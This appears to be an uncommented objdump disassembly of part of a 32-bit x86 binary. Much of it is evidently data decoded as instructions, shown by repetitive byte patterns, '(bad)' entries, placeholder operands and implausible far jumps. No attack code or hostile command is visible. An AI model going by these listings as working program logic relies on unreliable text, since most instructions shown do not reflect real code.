  4149f5:	dec    edi
  4149f6:	xor    DWORD PTR [edi+0x7b],ecx
  4149f9:	dec    edi
  4149fa:	xor    eax,0x364f3a4f
  4149ff:	dec    edi
  414a00:	push   ds
  414a01:	sbb    BYTE PTR [edi],0x83
  414a04:	setae  BYTE PTR [eax]
  414a07:	nop
  414a08:	jo     0x4149aa
  414a0a:	jno    0x4149ad
  414a0c:	aas    
  414a0d:	dec    edi
  414a0e:	jbe    0x414a5f
  414a10:	cmp    cl,BYTE PTR [edi+0x76]
  414a13:	dec    edi
  414a14:	ds dec edi
  414a16:	dec    esp
  414a17:	dec    edi
  414a18:	xor    DWORD PTR [edi+0x61],ecx
  414a1b:	dec    edi
  414a1c:	xor    eax,0x364f3a4f
  414a21:	dec    edi
  414a22:	push   ds
  414a23:	xchg   edx,eax
  414a24:	pop    ds
  414a25:	xchg   ebx,eax
  414a26:	bt     DWORD PTR [eax],eax
  414a29:	mov    al,ds:0xb171b070
  414a2e:	aas    
  414a2f:	dec    edi
  414a30:	pusha  
  414a31:	dec    edi
  414a32:	cmp    cl,BYTE PTR [edi+0x4e]
  414a35:	dec    edi
  414a36:	cmp    eax,0x314f7b4f
  414a3b:	dec    edi
  414a3c:	dec    ecx
  414a3d:	dec    edi
  414a3e:	xor    al,0x4f
  414a40:	cmp    cl,BYTE PTR [edi+0x36]
  414a43:	dec    edi
  414a44:	push   ds
  414a45:	mov    ds:0xb30fa31f,al
  414a4a:	add    BYTE PTR [eax-0x3e8e3f90],dh
  414a50:	aas    
  414a51:	dec    edi
  414a52:	pusha  
  414a53:	dec    edi
  414a54:	cmp    cl,BYTE PTR [edi+0x4e]
  414a57:	dec    edi
  414a58:	cmp    eax,0x314f704f
  414a5d:	dec    edi
  414a5e:	pop    edi
  414a5f:	dec    edi
  414a60:	xor    ecx,DWORD PTR [edi+0x3a]
  414a63:	dec    edi
  414a64:	xor    eax,0x1fb21e4f
  414a69:	mov    bl,0xf
  414a6b:	ret    
  414a6c:	add    al,al
  414a6e:	jo     0x414a40
  414a70:	jno    0x414a43
  414a72:	aas    
  414a73:	dec    edi
  414a74:	pusha  
  414a75:	dec    edi
  414a76:	cmp    cl,BYTE PTR [edi+0x4e]
  414a79:	dec    edi
  414a7a:	cmp    eax,0x314f6a4f
  414a7f:	dec    edi
  414a80:	dec    esi
  414a81:	dec    edi
  414a82:	xor    al,0x4f
  414a84:	cmp    cl,BYTE PTR [edi+0x28]
  414a87:	dec    edi
  414a88:	push   ds
  414a89:	ret    0xc31f
  414a8c:	psrlq  mm0,QWORD PTR [eax]
  414a8f:	shl    BYTE PTR [eax-0x20],1
  414a92:	jno    0x414a75
  414a94:	aas    
  414a95:	dec    edi
  414a96:	pusha  
  414a97:	dec    edi
  414a98:	cmp    cl,BYTE PTR [edi+0x4e]
  414a9b:	dec    edi
  414a9c:	cmp    eax,0x314f6b4f
  414aa1:	dec    edi
  414aa2:	dec    esp
  414aa3:	dec    edi
  414aa4:	xor    al,0x4f
  414aa6:	cmp    cl,BYTE PTR [edi+0x36]
  414aa9:	dec    edi
  414aaa:	push   ds
  414aab:	rcr    BYTE PTR [edi],cl
  414aad:	ror    DWORD PTR [edi],cl
  414aaf:	jecxz  0x414ab1
  414ab1:	loopne 0x414b23
  414ab3:	lock jno 0x414aa7
  414ab6:	aas    
  414ab7:	dec    edi
  414ab8:	ins    DWORD PTR es:[edi],dx
  414ab9:	dec    edi
  414aba:	cmp    cl,BYTE PTR [edi+0x5f]
  414abd:	dec    edi
  414abe:	cmp    eax,0x3e4f4a4f
  414ac3:	dec    edi
  414ac4:	cmp    cl,BYTE PTR [edi+0x3f]
  414ac7:	dec    edi
  414ac8:	push   ds
  414ac9:	loop   0x414aea
  414acb:	jecxz  0x414adc
  414acd:	repz add al,dh
  414ad0:	jo     0x414ad2
  414ad2:	jno    0x414ad5
  414ad4:	jo     0x414ae6
  414ad6:	jno    0x414ae9
  414ad8:	ds dec edi
  414ada:	jg     0x414b2b
  414adc:	cmp    cl,BYTE PTR [edi+0x53]
  414adf:	dec    edi
  414ae0:	cmp    al,0x4f
  414ae2:	push   0x4f
  414ae4:	ds dec edi
  414ae6:	dec    ebp
  414ae7:	dec    edi
  414ae8:	xor    ecx,DWORD PTR [edi+0x3a]
  414aeb:	dec    edi
  414aec:	xor    eax,0x1f021e4f
  414af1:	add    ecx,DWORD PTR [edi]
  414af3:	adc    eax,DWORD PTR [eax]
  414af5:	adc    BYTE PTR [eax+0x20],dh
  414af8:	jno    0x414b1b
  414afa:	aas    
  414afb:	dec    edi
  414afc:	add    BYTE PTR [eax],al
  414afe:	xchg   BYTE PTR [ecx+0x41],cl
  414b01:	add    BYTE PTR [edx+0x4b],bh
  414b04:	inc    ecx
  414b05:	add    BYTE PTR [edx-0x41ffbeb5],al
  414b0b:	dec    ebp
  414b0c:	inc    ecx
  414b0d:	add    BYTE PTR [esi],ah
  414b0f:	dec    ebp
  414b10:	inc    ecx
  414b11:	add    BYTE PTR [esi+0x6200414d],ch
  414b17:	dec    ebx
  414b18:	inc    ecx
  414b19:	add    BYTE PTR [esi+0x4b],ah
  414b1c:	inc    ecx
  414b1d:	add    BYTE PTR [esi-0x35ffbeb3],ah
  414b23:	dec    ebx
  414b24:	inc    ecx
  414b25:	add    BYTE PTR [ecx-0x49076357],dh
  414b2b:	mov    edx,0x4b7ef89c
  414b30:	inc    ecx
  414b31:	add    dh,bl
  414b33:	dec    esp
  414b34:	inc    ecx
  414b35:	add    dl,dh
  414b37:	dec    esp
  414b38:	inc    ecx
  414b39:	add    dh,bh
  414b3b:	dec    esp
  414b3c:	inc    ecx
  414b3d:	add    BYTE PTR [esi],cl
  414b3f:	dec    ebp
  414b40:	inc    ecx
  414b41:	add    BYTE PTR [esi-0x7dffbeb5],dh
  414b47:	dec    ecx
  414b48:	inc    ecx
  414b49:	add    dh,dl
  414b4b:	dec    ebx
  414b4c:	inc    ecx
  414b4d:	add    dh,al
  414b4f:	dec    ebx
  414b50:	inc    ecx
  414b51:	add    dl,al
  414b53:	dec    ebp
  414b54:	inc    ecx
  414b55:	add    BYTE PTR [esi],dh
  414b57:	test   DWORD PTR [eax+edi*8-0x7ee8f463],ebx
  414b5e:	mov    cl,BYTE PTR [ebx+0x41]
  414b61:	add    BYTE PTR [eax-0x737ee9e4],bl
  414b67:	or     eax,0x705
  414b6c:	inc    eax
  414b6d:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  414b71:	fstp   st(3)
  414b73:	inc    esp
  414b74:	inc    ebx
  414b75:	add    BYTE PTR [edx+0x68],dh
  414b78:	inc    ebp
  414b79:	inc    ecx
  414b7a:	mov    edx,?
  414b7c:	jne    0x414be0
  414b7e:	mov    ebp,gs
  414b80:	inc    BYTE PTR [edi]
  414b82:	mov    edi,0x7205a3fa
  414b87:	dec    ebx
  414b88:	inc    ecx
  414b89:	add    BYTE PTR [ecx],bh
  414b8b:	xchg   ebp,eax
  414b8c:	pushf  
  414b8d:	clc    
  414b8e:	cmp    DWORD PTR [esi-0x6ac70764],edx
  414b94:	pushf  
  414b95:	clc    
  414b96:	cmp    edx,DWORD PTR [ebp-0x6ac50764]
  414b9c:	pushf  
  414b9d:	clc    
  414b9e:	cmp    eax,0x3cf89c95
  414ba3:	xchg   ebp,eax
  414ba4:	pushf  
  414ba5:	clc    
  414ba6:	aas    
  414ba7:	xchg   ebp,eax
  414ba8:	pushf  
  414ba9:	clc    
  414baa:	ds xchg ebp,eax
  414bac:	pushf  
  414bad:	clc    
  414bae:	and    DWORD PTR [ebp-0x6ad90764],edx
  414bb4:	pushf  
  414bb5:	clc    
  414bb6:	jmp    0x4149:0x7a6003f9
  414bbd:	add    BYTE PTR [edi+ecx*1+0x49590043],dh
  414bc4:	imul   si,WORD PTR [esi],0xff85
  414bc8:	pushf  
  414bc9:	clc    
  414bca:	popf   
  414bcb:	jmp    0xac75320
  414bd0:	add    BYTE PTR [eax],al
  414bd2:	jbe    0x414c1d
  414bd4:	inc    ecx
  414bd5:	add    BYTE PTR [ebx+0xe040b],bl
	...
  414c0b:	adc    BYTE PTR [eax+0x0],al
  414c0e:	fcomp  DWORD PTR [edi]
  414c10:	inc    ebx
  414c11:	add    BYTE PTR [eax],al
  414c13:	add    BYTE PTR [eax],al
  414c15:	add    BYTE PTR [ecx+0x0],cl
  414c18:	inc    esp
  414c19:	add    BYTE PTR [ecx+0x0],ch
  414c1c:	add    BYTE PTR fs:[ebx+0x0],cl
  414c20:	dec    edx
  414c21:	add    BYTE PTR [ebx+0x0],cl
  414c24:	dec    edx
  414c25:	add    BYTE PTR [eax+eax*1+0x6b],al
  414c29:	add    BYTE PTR [eax+eax*1+0x6a],ch
  414c2d:	add    BYTE PTR [eax+eax*1+0x4c],al
  414c31:	add    BYTE PTR [ecx+0x0],cl
  414c34:	inc    esp
  414c35:	add    BYTE PTR [eax+eax*1+0x49],cl
  414c39:	add    BYTE PTR [ebp+0x0],dl
  414c3c:	dec    edx
  414c3d:	add    BYTE PTR [ebx+0x0],cl
  414c40:	inc    esp
  414c41:	add    BYTE PTR [eax+eax*1+0x4a],cl
  414c45:	add    BYTE PTR [ebx+0x0],cl
  414c48:	dec    eax
  414c49:	add    BYTE PTR [eax+eax*1+0x4a],al
	...
  414c55:	add    BYTE PTR [ebx+ebp*2+0x6a],ah
  414c59:	jae    0x414cc6
  414c5b:	ins    BYTE PTR es:[edi],dx
  414c5c:	popa   
  414c5d:	imul   ebp,DWORD PTR [edx+ebp*2+0x4c],0x4b
  414c62:	dec    ecx
  414c63:	dec    edx
  414c64:	inc    esp
  414c65:	inc    esi
  414c66:	ins    BYTE PTR es:[edi],dx
  414c67:	imul   ebp,DWORD PTR [ebx+0x75],0x736c6466
  414c6e:	imul   ebp,DWORD PTR [ecx+0x68],0x67
  414c72:	ins    BYTE PTR es:[edi],dx
  414c73:	jae    0x414ce0
  414c75:	push   0x66
  414c77:	ins    BYTE PTR es:[edi],dx
  414c78:	imul   ecx,DWORD PTR [edx+0x4b],0x44
  414c7c:	imul   sp,WORD PTR [esi+eiz*2+0x68],0x73
  414c82:	imul   esp,DWORD PTR [edi+0x66],0x68
  414c86:	jae    0x414cec
  414c88:	imul   esi,DWORD PTR [ebp+0x6b],0x64756679
  414c8f:	imul   esi,DWORD PTR [ebx+0x6b],0x486a6b68
  414c96:	dec    ebx
  414c97:	dec    edx
  414c98:	inc    esp
  414c99:	inc    esi
  414c9a:	push   0x756b7364
  414c9f:	outs   dx,DWORD PTR ds:[si]
  414ca1:	imul   esi,DWORD PTR [ebx+0x66],0x6b677564
  414ca8:	push   0x66
  414caa:	fs jae 0x414d15
  414cad:	imul   ebp,DWORD PTR [si+0x66],0x68
  414cb2:	ins    BYTE PTR es:[edi],dx
  414cb3:	imul   esp,DWORD PTR [edi+0x6a],0x75
  414cb7:	push   0x6a6b6466
  414cbc:	jne    0x414d25
  414cbe:	jns    0x414d24
  414cc0:	imul   si,WORD PTR [di+0x66],0x6764
  414cc7:	jne    0x414d35
  414cc9:	fs pushw 0x6c67
  414cce:	push   0x68
  414cd0:	data16 add BYTE PTR fs:[eax],al
  414cd4:	add    BYTE PTR [eax],al
  414cd6:	add    BYTE PTR [eax],al
  414cd8:	add    BYTE PTR [eax],al
  414cda:	xor    edx,DWORD PTR [ebx]
  414cdc:	inc    ecx
  414cdd:	add    BYTE PTR [ebp+0x4f],dl
  414ce0:	pop    edi
  414ce1:	dec    edi
  414ce2:	dec    esp
  414ce3:	dec    edi
  414ce4:	dec    eax
  414ce5:	dec    edi
  414ce6:	pop    edi
  414ce7:	dec    edi
  414ce8:	push   esi
  414ce9:	dec    edi
  414cea:	or     eax,0x3a4f0c4f
  414cef:	dec    edi
  414cf0:	add    BYTE PTR [eax],al
  414cf2:	push   ecx
  414cf3:	dec    edi
  414cf4:	pop    esi
  414cf5:	dec    edi
  414cf6:	push   ebx
  414cf7:	dec    edi
  414cf8:	or     eax,0x3a4f0c4f
  414cfd:	dec    edi
  414cfe:	dec    edi
  414cff:	dec    edi
  414d00:	dec    ebp
  414d01:	dec    edi
  414d02:	pop    edi
  414d03:	dec    edi
  414d04:	dec    esp
  414d05:	dec    edi
  414d06:	or     eax,0x3a4f0c4f
  414d0b:	dec    edi
  414d0c:	add    BYTE PTR [eax],al
  414d0e:	dec    ebp
  414d0f:	dec    edi
  414d10:	push   edx
  414d11:	dec    edi
  414d12:	push   esi
  414d13:	dec    edi
  414d14:	inc    ecx
  414d15:	dec    edi
  414d16:	pop    ebx
  414d17:	dec    edi
  414d18:	dec    edx
  414d19:	dec    edi
  414d1a:	push   ebx
  414d1b:	dec    edi
  414d1c:	cmp    cl,BYTE PTR [edi+0x0]
  414d1f:	add    BYTE PTR [eax],al
  414d21:	add    BYTE PTR [eax],al
  414d23:	add    BYTE PTR [eax],al
  414d25:	add    BYTE PTR [esi+0x7d],ch
  414d28:	outs   dx,BYTE PTR ds:[esi]
  414d29:	lea    ebp,[esi-0x63]
  414d2c:	outs   dx,BYTE PTR ds:[esi]
  414d2d:	lods   eax,DWORD PTR ds:[esi]
  414d2e:	outs   dx,BYTE PTR ds:[esi]
  414d2f:	mov    ebp,0xdd6ecd6e
  414d34:	outs   dx,BYTE PTR ds:[esi]
  414d35:	in     eax,dx
  414d36:	outs   dx,BYTE PTR ds:[esi]
  414d37:	std    
  414d38:	outs   dx,BYTE PTR ds:[esi]
  414d39:	or     eax,0x2d6e1d6e
  414d3e:	outs   dx,BYTE PTR ds:[esi]
  414d3f:	cmp    eax,0x6d6e5d6e
  414d44:	outs   dx,BYTE PTR ds:[esi]
  414d45:	jb     0x414db5
  414d47:	jae    0x414db7
  414d49:	jo     0x414db9
  414d4b:	jno    0x414dbb
  414d4d:	jbe    0x414dbd
  414d4f:	ja     0x414dbf
  414d51:	je     0x414dc1
  414d53:	jne    0x414dc3
  414d55:	mov    ch,BYTE PTR [esi-0x75]
  414d58:	outs   dx,BYTE PTR ds:[esi]
  414d59:	mov    BYTE PTR [esi-0x77],ch
  414d5c:	outs   dx,BYTE PTR ds:[esi]
  414d5d:	mov    gs,WORD PTR [esi+0x7c]
  414d60:	pop    esi
  414d61:	jge    0x414db1
  414d63:	jge    0x414d23
  414d65:	jge    0x414db7
  414d67:	(bad)  
  414d68:	jno    0x414dda
  414d6a:	mov    cl,0xb1
  414d6c:	outs   dx,BYTE PTR ds:[esi]
  414d6d:	jae    0x414dec
  414d6f:	bound  esp,QWORD PTR [edx+0x7c265fc6]
  414d75:	add    BYTE PTR [ecx+0x17],al
  414d78:	mov    bl,0x56
  414d7a:	mov    cl,0xf4
  414d7c:	inc    edx
  414d7d:	aaa    
  414d7e:	inc    edx
  414d7f:	jle    0x414d12
  414d81:	jno    0x414ddb
  414d83:	mov    cl,0x4
  414d85:	imul   esp,DWORD PTR [eax-0x70282bf8],0x5
  414d8c:	inc    esp
  414d8d:	xlat   BYTE PTR ds:[ebx]
  414d8e:	leave  
  414d8f:	xchg   ebx,eax
  414d90:	inc    eax
  414d91:	adc    eax,ecx
  414d93:	jge    0x414d60
  414d95:	faddp  st(7),st
  414d97:	leave  
  414d98:	xchg   BYTE PTR [esi+0x1fa23208],ah
  414d9e:	fs icebp 
  414da0:	dec    eax
  414da1:	(bad)  
  414da2:	leave  
  414da3:	sbb    cl,cl
  414da5:	jno    0x414d93
  414da7:	(bad)  [ebx+0x7]
  414daa:	ror    BYTE PTR [ebx+0x41],cl
  414dad:	add    BYTE PTR [ebp+0x2f],al
  414db0:	shl    BYTE PTR [edx],0x2c
  414db3:	xor    eax,DWORD PTR [ecx+0x0]
  414db6:	inc    esi
  414db7:	push   ebx
  414db8:	outs   dx,DWORD PTR ds:[esi]
  414db9:	push   ebx
  414dba:	push   0x4b
  414dbc:	inc    ecx
  414dbd:	add    dh,cl
  414dbf:	dec    ebx
  414dc0:	inc    ecx
  414dc1:	add    BYTE PTR [ebp+ebp*8+0x712],cl
	...
  414de4:	add    BYTE PTR [eax],al
  414de6:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  414ded:	pop    ecx
  414dee:	outs   dx,BYTE PTR ds:[esi]
  414def:	jbe    0x414e69
  414df1:	jns    0x414e47
  414df3:	push   ecx
  414df4:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  414df8:	je     0x414e5b
	...
  414e0e:	jp     0x414e64
  414e10:	arpl   WORD PTR [ecx+0x4b],cx
  414e13:	push   edx
  414e14:	imul   ebp,DWORD PTR [eax+0x53],0x4746536f
  414e1b:	push   0x66495949
  414e20:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  414e24:	push   esi
  414e25:	jb     0x414e8f
  414e27:	add    BYTE PTR [ebx+0x51],al
  414e2a:	ins    BYTE PTR es:[edi],dx
  414e2b:	pop    eax
  414e2c:	ja     0x414e7b
  414e2e:	je     0x414ea6
  414e30:	bound  eax,QWORD PTR [ebx+eiz*2+0x0]
  414e34:	in     al,0xf5
  414e36:	jnp    0x414e86
  414e38:	jnp    0x414e08
  414e3a:	cmc    
  414e3b:	push   DWORD PTR [ebx]
  414e3d:	sar    ebx,cl
  414e3f:	fst    DWORD PTR ds:0x8c979bef
  414e45:	in     eax,0x0
  414e47:	add    dh,dh
  414e49:	add    BYTE PTR [eax],al
  414e4b:	add    BYTE PTR [eax+edi*8-0x67bec72d],al
  414e52:	int    0xc0
  414e54:	push   ebp
  414e55:	(bad)  
  414e56:	push   DWORD PTR [eax+0x20]
  414e59:	fxch   st(1)
  414e5b:	xor    BYTE PTR [edi+0x71],al
  414e5e:	mov    edx,fs
  414e60:	jns    0x414de3
  414e62:	loopne 0x414e1a
  414e64:	repz in al,dx
  414e66:	retf   
  414e67:	cmc    
  414e68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e69:	int3   
  414e6a:	jp     0x414eea
  414e6c:	cdq    
  414e6d:	outs   dx,BYTE PTR ds:[esi]
  414e6e:	shl    DWORD PTR [esp+eax*2],1
  414e71:	pop    esp
  414e72:	jnp    0x414eca
  414e74:	outs   dx,DWORD PTR ds:[esi]
  414e75:	adc    eax,0x4d12e596
  414e7a:	dec    ebp
  414e7b:	shl    ch,1
  414e7d:	push   ebp
  414e7e:	fldcw  WORD PTR [ecx-0x2e81b205]
  414e84:	push   ebp
  414e85:	cmc    
  414e86:	sub    al,0x32
  414e88:	popf   
  414e89:	aas    
  414e8a:	fwait
  414e8b:	leave  
  414e8c:	mov    eax,ds:0xce343c42
  414e91:	sbb    BYTE PTR [ecx-0x63],dh
  414e94:	test   edx,ecx
  414e96:	dec    DWORD PTR [esi]
  414e98:	outs   dx,BYTE PTR ds:[esi]
  414e99:	sbb    eax,0xaa013f01
  414e9e:	pop    eax
  414e9f:	push   cs
  414ea0:	dec    esp
  414ea1:	dec    ecx
  414ea2:	mov    eax,0xa841b843
  414ea8:	adc    ecx,DWORD PTR [edx+0xf3cdb4c]
  414eae:	fadd   QWORD PTR ds:0x6a6b1d3f
  414eb4:	inc    ebx
  414eb5:	movhlps xmm0,xmm7
  414eb8:	pop    ebp
  414eb9:	les    esp,FWORD PTR [ecx+0x32a28a5]
  414ebf:	leave  
  414ec0:	adc    dl,cl
  414ec2:	push   ebx
  414ec3:	popf   
  414ec4:	dec    edx
  414ec5:	inc    edx
  414ec6:	inc    ecx
  414ec7:	pop    eax
  414ec8:	call   0x697f:0x76f62d0a
  414ecf:	ja     0x414e53
  414ed1:	jp     0x414e9f
  414ed3:	enter  0x15f6,0xca
  414ed7:	or     DWORD PTR [ebp+ebx*2+0x3f],edi
  414edb:	xchg   edi,eax
  414edc:	cmc    
  414edd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ede:	neg    BYTE PTR [esi]
  414ee0:	shr    BYTE PTR [edi-0x4cbe8b2f],0x48
  414ee7:	mul    BYTE PTR [esi-0xb06b659]
  414eed:	std    
  414eee:	sbb    edi,ebx
  414ef0:	daa    
  414ef1:	xor    bh,BYTE PTR [esi]
  414ef3:	push   es
  414ef4:	pusha  
  414ef5:	xor    eax,0x955f1ac
  414efa:	or     BYTE PTR [eax],bh
  414efc:	dec    ecx
  414efd:	mov    BYTE PTR [edi],0xc7
  414f00:	(bad)  
  414f03:	ret    
  414f04:	or     dh,BYTE PTR [edx-0x6dce5aee]
  414f0a:	sub    al,0xef
  414f0c:	xor    DWORD PTR [ebx-0x7a326b68],esi
  414f12:	ret    
  414f13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f14:	pop    ecx
  414f15:	and    cl,BYTE PTR [ecx-0x4a]
  414f18:	xchg   ebx,eax
  414f19:	into   
  414f1a:	hlt    
  414f1b:	call   0xf7a0:0x13c21f80
  414f22:	arpl   di,bx
  414f24:	leave  
  414f25:	mov    al,ds:0x6dbaedcd
  414f2a:	aam    0x1e
  414f2c:	pop    eax
  414f2d:	dec    edx
  414f2e:	mov    ch,0x43
  414f30:	imul   esp,ebx,0x58
  414f33:	inc    ecx
  414f34:	in     eax,dx
  414f35:	lock mov bl,BYTE PTR [edi+0x4a]
  414f39:	mov    ah,0xc6
  414f3b:	lea    ebp,[ecx-0x43]
  414f3e:	xor    ecx,ebx
  414f40:	xchg   edx,eax
  414f41:	mov    bl,0x0
	...
  414fb3:	add    BYTE PTR [edx-0x26],bl
  414fb6:	push   esi
  414fb7:	pusha  
  414fb8:	(bad)  
  414fb9:	in     al,dx
  414fba:	jle    0x414fb6
  414fbc:	cs pop ebx
  414fbe:	pop    ss
  414fbf:	ret    0xc9d9
  414fc2:	jl     0x41503e
  414fc4:	and    dh,0x0
  414fc7:	add    dh,dh
  414fc9:	add    BYTE PTR [eax],al
  414fcb:	add    BYTE PTR [ebx],ah
  414fcd:	int3   
  414fce:	cmp    eax,0x7f287ab2
  414fd3:	mov    eax,ds:0x980efb54
  414fd8:	add    eax,0x59c52069
  414fdd:	outs   dx,DWORD PTR ds:[esi]
  414fde:	dec    ebx
  414fdf:	sub    eax,0x8a8bb6a9
  414fe4:	push   ss
  414fe5:	neg    BYTE PTR [ebx+0x65c32a5]
  414feb:	sub    eax,0x3f0aab20
  414ff0:	lock dec esp
  414ff2:	mov    ebx,0xbfa131ce
  414ff7:	pop    ebx
  414ff8:	enter  0x2842,0x3b
  414ffc:	aam    0xd8
  414ffe:	pop    ss
  414fff:	sub    DWORD PTR [eax],esp
  415001:	xchg   esi,eax
  415002:	or     BYTE PTR [ecx+0x3b],bh
  415005:	sub    cl,BYTE PTR [ebp+esi*4-0x1d]
  415009:	xchg   edx,eax
  41500a:	int3   
  41500b:	mov    bh,0xf2
  41500d:	and    ebx,DWORD PTR [ebp-0x763c0f8a]
  415013:	pop    ebp
  415014:	cli    
  415015:	xchg   esp,eax
  415016:	pop    ecx
  415017:	push   es
  415018:	mov    bl,0x74
  41501a:	jb     0x414fc9
  41501c:	or     al,0xf0
  41501e:	or     al,0x1d
  415020:	adc    ch,BYTE PTR [eax-0x74]
  415023:	in     al,dx
  415024:	test   eax,0xc5fc6469
  415029:	icebp  
  41502a:	repz dec eax
  41502c:	ret    0xa0d4
  41502f:	sbb    eax,0xc35c3510
  415034:	sbb    DWORD PTR ds:0xb55717b4,edx
  41503a:	fwait
  41503b:	test   ebp,edi
  41503d:	out    0xc6,eax
  41503f:	mov    ebp,0xf8794cc2
  415044:	fisubr DWORD PTR [edx-0x1e3695fb]
  41504a:	xchg   edx,eax
  41504b:	xor    cl,cl
  41504d:	aad    0xdb
  41504f:	adc    BYTE PTR [edi-0x6f9ebbb7],ah
  415055:	add    al,0xa4
  415057:	jg     0x41501a
  415059:	mov    edi,0x9945e3b7
  41505e:	and    DWORD PTR [edx-0x141bf4f7],esi
  415064:	xchg   esp,eax
  415065:	and    BYTE PTR [esi+edx*4+0x7e],bl
  415069:	das    
  41506a:	push   0xfd8e2fa6
  41506f:	and    al,0x33
  415071:	jno    0x415012
  415073:	pop    ebx
  415074:	daa    
  415075:	hlt    
  415076:	ret    
  415077:	sbb    al,0xb3
  415079:	sub    BYTE PTR ds:0x5e054719,ch
  41507f:	xor    al,BYTE PTR [edx+0x70]
  415082:	xchg   BYTE PTR [ecx-0x50],bl
  415085:	cmp    ebx,DWORD PTR [edx]
  415087:	mov    ds:0xa3f285c0,al
  41508c:	test   BYTE PTR [ebx+0x31],ah
  41508f:	fistp  DWORD PTR [eax-0x3a]
  415092:	and    DWORD PTR [edi-0x4ee1749e],0xffffffd3
  415099:	mov    ah,0xee
  41509b:	add    bl,BYTE PTR [ebx]
  41509d:	jg     0x41510e
  41509f:	and    eax,eax
  4150a1:	inc    edi
  4150a2:	mov    edx,0x7a6693e8
  4150a7:	pop    edx
  4150a8:	xor    esi,edx
  4150aa:	pop    edx
  4150ab:	pushf  
  4150ac:	adc    ebx,DWORD PTR ds:0xfea67a25
  4150b2:	mov    ebp,0x1ffce8d8
  4150b7:	out    dx,al
  4150b8:	aam    0x7c
  4150ba:	clc    
  4150bb:	lods   al,BYTE PTR ds:[esi]
  4150bc:	rcl    eax,0x73
  4150bf:	jmp    0x4150c7
  4150c1:	fiadd  DWORD PTR [eax]
	...
  415133:	add    BYTE PTR [edx],al
  415135:	adc    al,BYTE PTR [ecx]
  415137:	mov    ds:0xb3a2b311,eax
  41513c:	adc    ah,BYTE PTR [esi-0x163e3b27]
  415142:	rcl    edx,cl
  415144:	js     0x41512d
  415146:	add    BYTE PTR [eax],al
  415148:	test   BYTE PTR [eax],0x0
  41514b:	add    BYTE PTR [ecx+0x41e989c1],cl
  415151:	mov    bl,0x60
  415153:	jl     0x415134
  415155:	mov    ah,0x9e
  415157:	les    ebx,FWORD PTR [ebp+ebp*1+0x32]
  41515b:	sbb    dl,0x30
  41515e:	jne    0x4151c3
  415160:	or     cl,BYTE PTR [edx-0x72]
  415163:	mov    esp,0xb50cd3b5
  415168:	sub    DWORD PTR [eax+0x5a044f0f],0x4d7d4e5d
  415172:	mov    ch,0xcf
  415174:	mov    ch,0x7d
  415176:	out    dx,al
  415177:	sub    edi,DWORD PTR [esi-0x5]
  41517a:	jne    0x4151c7
  41517c:	xor    DWORD PTR [ecx+0x7b],esp
  41517f:	dec    esp
  415180:	pop    ebp
  415181:	mov    dh,0xf
  415183:	(bad)  
  415184:	shl    BYTE PTR [esi+0x27],cl
  415187:	hlt    
  415188:	(bad)  
  415189:	pop    esp
  41518a:	sub    ch,ch
  41518c:	pop    esi
  41518d:	sub    dh,ch
  41518f:	outs   dx,DWORD PTR ds:[esi]
  415190:	clc    
  415191:	jl     0x4151be
  415193:	mov    ebp,0x87312486
  415198:	mov    bh,0xd3
  41519a:	or     dl,BYTE PTR [ecx]
  41519c:	shl    ebp,1
  41519e:	push   ecx
  41519f:	retf   0x6ee1
  4151a2:	sub    ecx,eax
  4151a4:	pusha  
  4151a5:	push   ss
  4151a6:	or     DWORD PTR [ebx-0x60],esi
  4151a9:	aaa    
  4151aa:	mov    WORD PTR [ebx],?
  4151ac:	imul   edx,DWORD PTR [ebx+0x5],0xd3ed943c
  4151b3:	jg     0x415161
  4151b5:	inc    ebp
  4151b6:	popf   
  4151b7:	dec    ebx
  4151b8:	ds in  eax,dx
  4151ba:	aam    0xee
  4151bc:	jb     0x415238
  4151be:	xchg   ebx,eax
  4151bf:	xor    BYTE PTR [eax],bh
  4151c1:	mov    ds:0x82848319,al
  4151c6:	cmp    BYTE PTR [edi+0x35],bl
  4151c9:	push   0xffffffc5
  4151cb:	mov    dl,0xa7
  4151cd:	arpl   dx,sp
  4151cf:	xlat   BYTE PTR ds:[ebx]
  4151d0:	sub    bh,BYTE PTR [edi]
  4151d2:	add    eax,0x31c225df
  4151d7:	or     esi,eax
  4151d9:	imul   ebx,DWORD PTR [eax],0x14bccf82
  4151df:	cmc    
  4151e0:	mov    cl,0x54
  4151e2:	arpl   WORD PTR [ebx],si
  4151e4:	xor    ah,BYTE PTR [ecx-0x6aa4475e]
  4151ea:	clc    
  4151eb:	lods   al,BYTE PTR ds:[esi]
  4151ec:	add    ah,BYTE PTR [esi+0x62]
  4151ef:	(bad)  
  4151f0:	xor    eax,0xaf648cee
  4151f5:	cdq    
  4151f6:	xchg   edi,eax
  4151f7:	ret    0xc3fd
  4151fa:	inc    esp
  4151fb:	hlt    
  4151fc:	leave  
  4151fd:	mov    gs,WORD PTR [ecx]
  4151ff:	inc    esi
  415200:	jmp    0x2745:0x3cd890d2
  415207:	mov    edx,0x1634605b
  41520c:	in     al,0xd6
  41520e:	mov    ds:0x6dac6d85,al
  415213:	scas   eax,DWORD PTR es:[edi]
  415214:	call   0x97194bd6
  415219:	inc    ecx
  41521a:	mov    edx,0xe1f35660
  41521f:	pop    esp
  415220:	gs aas 
  415222:	push   ds
  415223:	push   ecx
  415224:	inc    edi
  415225:	xchg   ebx,eax
  415226:	mov    WORD PTR [edx+edx*8-0x4c],es
  41522a:	xlat   BYTE PTR ds:[ebx]
  41522b:	neg    BYTE PTR [edi-0x6ad48c0b]
  415231:	sbb    ch,BYTE PTR [ebp-0x483a2f3c]
  415237:	stc    
  415238:	sar    esp,1
  41523a:	addr16 retf 0xe4d9
  41523e:	shl    DWORD PTR [edx+0x22a4],0x0
	...
  4152b1:	add    BYTE PTR [eax],al
  4152b3:	add    BYTE PTR [ecx],al
  4152b5:	sub    DWORD PTR [ebp-0x23],0xddb1fded
  4152bc:	stos   BYTE PTR es:[edi],al
  4152bd:	dec    edx
  4152be:	out    0x6e,al
  4152c0:	repnz sbb eax,0xe86e6b6b
  4152c6:	add    BYTE PTR [eax],al
  4152c8:	test   BYTE PTR [eax],0x0
  4152cb:	add    BYTE PTR [eax+0x32],ch
  4152ce:	stos   BYTE PTR es:[edi],al
  4152cf:	test   eax,0xc1bcf847
  4152d4:	mov    DWORD PTR cs:[eax+0x102d055],esp
